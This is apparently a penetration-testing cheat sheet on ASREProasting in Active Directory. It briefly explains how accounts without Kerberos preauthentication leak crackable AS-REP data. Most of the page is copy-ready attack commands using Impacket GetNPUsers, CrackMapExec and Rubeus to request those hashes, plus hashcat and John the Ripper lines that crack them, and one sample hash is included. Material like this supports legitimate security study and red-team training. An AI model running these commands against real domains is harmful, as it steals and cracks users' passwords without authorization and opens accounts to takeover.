# ASREProast

>When asking the KDC \(Key Distribution Center\) for a TGT \(Ticket Granting Ticket\), the requesting user needs to send a piece of information \(a timestamp\) encrypted with it's own credentials. It ensures the user is requesting a TGT for himself. This is called Kerberos preauthentication.
>
The TGT is then sent to the user in the `KRB_AS_REP` message, but that message also contains a session key. That session key is encrypted with the requested user's NT hash.
>
Kerberos preauthentication prevents attackers from requesting a TGT for any user, receive the `KRB_AS_REP` message, extract the session key and crack it offline in an attempt to retrieve that user's password.
>
Because some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting.
>
While this attack can be carried out without any prior foothold \(domain user credentials\), there is no way of finding out users with `Do not require Kerberos preauthentication` set without that prior foothold.
>
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) can get TGTs for the users that have the property `Do not require Kerberos preauthentication` set.
![AS-Rep Setting](asrep.png)

```bash
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass

# with a users file
GetNPUsers.py 'htb.local/' -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt

# create common username permutations with known names
./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt

# with a password
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt 'DOMAIN/USER:Password'

# with an NT hash
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' 'DOMAIN/USER'
```

This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec).
```bash
crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt
```

The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.
```bash
Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
```

Depending on the output format used \(`hashcat` or `john`\), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try cracking the hashes.
```bash
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```

```bash
john --wordlist=$wordlist ASREProastables.txt
```

#### Examples
```
.\Rubeus.exe asreproast

# Get a hash like this
$krb5asrep$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA

# Add the $23$
$krb5asrep$23$spot@offense.local:3171ea207b3a6fdaee52ba247c20362e$56fe7dc0caba8cb7d3a02a140c612a917df3343c01bcdab0b669efa15b29b2aebbfed2b4f3368a897b833a6b95d5c2f1c2477121c8f5e005aa2a588c5ae72aadfcbf1aedd8b7ac2f2e94e94cb101e27a2e9906e8646919815d90b4186367b6d5072ab9edd0d7b85519fbe33997b3d3b378340e3f64caa92595523b0ad8dc8e0abe69dda178d8ba487d3632a52be7ff4e786f4c271172797dcbbded86020405b014278d5556d8382a655a6db1787dbe949b412756c43841c601ce5f21a36a0536cfed53c913c3620062fdf5b18259ea35de2b90c403fbadd185c0f54b8d0249972903ca8ff5951a866fc70379b9da

# Crack it
hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt
```

References:
https://blog.xpnsec.com/kerberos-attacks-part-2/
https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/